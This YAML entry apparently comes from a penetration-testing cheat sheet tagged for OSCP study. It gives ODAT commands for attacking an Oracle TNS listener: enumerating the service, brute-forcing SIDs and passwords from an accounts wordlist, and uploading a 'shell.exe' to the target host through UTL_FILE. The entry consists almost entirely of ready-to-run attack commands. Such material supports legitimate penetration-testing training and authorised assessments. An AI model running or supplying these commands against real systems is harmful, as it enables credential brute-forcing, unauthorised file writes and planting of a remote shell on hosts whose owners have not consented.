---
variants:
  - label: all
    command: |
      odat all -s $IP
  - label: sidguesser
    command: |
      odat sidguesser -s $IP -p 1521
  - label: passwordguesser
    command: |
      odat passwordguesser -s $IP -p 1521 -d XE --accounts-file /usr/share/odat/accounts/accounts.txt
  - label: upload
    command: |
      odat utlfile -s $IP -p 1521 -d XE -U $USER -P $PASSWORD --putFile 'C:\temp' shell.exe shell.exe
description: Attack an Oracle TNS listener, guess SIDs and accounts, then read and write files on the host
os: [Linux]
category: [oscp, cli]
service: [Oracle]
phase: [Enumeration, Exploitation]
references:
  - https://github.com/quentinhardy/odat
---
